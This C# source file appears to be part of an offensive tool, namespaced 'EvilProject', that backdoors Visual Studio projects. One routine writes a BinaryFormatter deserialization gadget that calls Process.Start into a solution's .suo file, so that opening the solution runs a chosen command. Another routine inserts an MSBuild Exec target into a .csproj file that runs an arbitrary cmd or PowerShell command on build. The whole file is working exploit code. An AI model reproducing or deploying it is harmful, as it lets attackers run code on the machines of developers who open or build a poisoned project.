using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Xml.Linq;
using OpenMcdf;
using suo_exploit_test.Helpers.ModifiedVulnerableBinaryFormatters;

namespace EvilProject
{
    public class Modules
    {
        private static byte[] InjectSuoFile(byte[] SuoFile, string cmdFileName, string cmdArguments = "")
        {
            byte[] output;
            using (MemoryStream stream = new MemoryStream(SuoFile))
            {
                using (var compoundFile = new CompoundFile(stream))
                {
                    CFStream dataStream = compoundFile.RootStorage.GetStream("VsToolboxService");
                    byte[] deserializationPayload = CreateDeserializationPayload(cmdFileName, cmdArguments);
                    byte[] payload;
                    using (MemoryStream payloadStream = new MemoryStream())
                    {
                        BinaryWriter payloadWriter = new BinaryWriter(payloadStream);
                        payloadWriter.Write(1);
                        payloadWriter.Write("");
                        payloadWriter.Write(1);
                        payloadWriter.Write("");
                        payloadWriter.Write("");
                        payloadWriter.Write(deserializationPayload);
                        payload = payloadStream.ToArray();
                        payloadWriter.Close();
                        payloadWriter.Dispose();
                    }
                    dataStream.SetData(payload);
                    using (MemoryStream outputStream = new MemoryStream())
                    {
                        compoundFile.Save(outputStream);
                        output = outputStream.ToArray();
                    }
                }
            }
            return output;
        }
        private static byte[] CreateDeserializationPayload(string cmdFileName, string cmdArguments = "")
        {
            Delegate da = new Comparison<string>(String.Compare);
            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
            IComparer<string> comp = Comparer<string>.Create(d);
            SortedSet<string> set = new SortedSet<string>(comp);
            set.Add(cmdFileName);
            if (!string.IsNullOrEmpty(cmdArguments))
            {
                set.Add(cmdArguments);
            }
            else
            {
                set.Add("");
            }
            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = d.GetInvocationList();
            invoke_list[1] = new Func<string, string, Process>(Process.Start);
            fi.SetValue(d, invoke_list);
            MemoryStream stream = new MemoryStream();
            System.Runtime.Serialization.Formatters.Binary.BinaryFormatter fmt = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
            fmt.Serialize(stream, set);
            string b64encoded = Convert.ToBase64String(stream.ToArray());
            string payload_bf_json = @"[{'Id': 1,
    'Data': {
      '$type': 'SerializationHeaderRecord',
      'binaryFormatterMajorVersion': 1,
      'binaryFormatterMinorVersion': 0,
      'binaryHeaderEnum': 0,
      'topId': 1,
      'headerId': -1,
      'majorVersion': 1,
      'minorVersion': 0
}},{'Id': 2,
    'TypeName': 'ObjectWithMapTyped',
    'Data': {
      '$type': 'BinaryObjectWithMapTyped',
      'binaryHeaderEnum': 4,
      'objectId': 1,
      'name': 'System.Security.Claims.ClaimsPrincipal',
      'numMembers': 1,
      'memberNames':['m_serializedClaimsIdentities'],
      'binaryTypeEnumA':[1],
      'typeInformationA':[null],
      'typeInformationB':[null],
      'memberAssemIds':[0],
      'assemId': 0
}},{'Id': 10,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 5,
      'value': '" + b64encoded + @"'
}},{'Id': 11,
    'TypeName': 'MessageEnd',
    'Data': {
      '$type': 'MessageEnd'
}}]";
            MemoryStream ms = AdvancedBinaryFormatterParser.JsonToStream(payload_bf_json);
            return ms.ToArray();
        }
        public static void ProjectInject(string path,string trigger ,string command, bool ps)
        {
            string resolvedCommand = ResolveCommandOrPath(command);

            XDocument csproj = XDocument.Load(path);

            XNamespace msbuildNamespace = "http://schemas.microsoft.com/developer/msbuild/2003";
            XElement targetElement;

            if (ps)
            {
                targetElement = new XElement(msbuildNamespace + "Target",
    new XAttribute("Name", trigger),
    new XElement(msbuildNamespace + "Exec", new XAttribute("Command", "powershell "+resolvedCommand))
);
            }
            else
            {
                targetElement = new XElement(msbuildNamespace + "Target",
    new XAttribute("Name", trigger),
    new XElement(msbuildNamespace + "Exec", new XAttribute("Command", "cmd /c " + resolvedCommand))
);
            }

            XElement projectElement = csproj.Element(msbuildNamespace + "Project");

            if (projectElement != null)
            {
                projectElement.Add(targetElement);
                EConsole.ELog("Writing file to disk...", 0);

                csproj.Save(path);
                EConsole.ELog("Successfully wrote file to disk!", 1);

            }
            else
            {
                EConsole.ELog("Project element not found, are you sure this is a valid Visual Studio project?", 3);
            }
        }
        public static void SuoInject(string path, string command)
        {
            Random r = new Random();
            EConsole.ELog("Starting suo injection...", 0);
            try
            {
                string input = path;
                string tempOutput = Path.Combine(System.Environment.CurrentDirectory, r.Next(100000, 200000).ToString());
                string finalOutput = Path.Combine(Path.GetDirectoryName(input), ".suo");
                string cmdFile = ResolveCommandOrPath(command);

                EConsole.ELog("Injecting Suo file...", 0);
                byte[] data = InjectSuoFile(File.ReadAllBytes(input), cmdFile);

                EConsole.ELog("Writing file to disk...", 0);
                File.WriteAllBytes(tempOutput, data);

                if (File.Exists(finalOutput))
                {
                    File.Delete(finalOutput);
                }

                File.Move(tempOutput, finalOutput);

                EConsole.ELog("Successfully wrote file to disk!", 1);
            }
            catch (Exception ex)
            {
                EConsole.ELog(ex.Message, 3);
            }
        }

        private static string ResolveCommandOrPath(string input)
        {
            if (File.Exists(input))
            {
                string content = File.ReadAllText(input);
                return content.Replace("\n", " ").Replace("\r", " ").Trim();
            }
            else if (Directory.Exists(input))
            {
                return input;
            }
            else
            {
                if (input.StartsWith("\"") && input.EndsWith("\""))
                {
                    return input.Substring(1, input.Length - 2);
                }
                return input;
            }
        }
    }
}
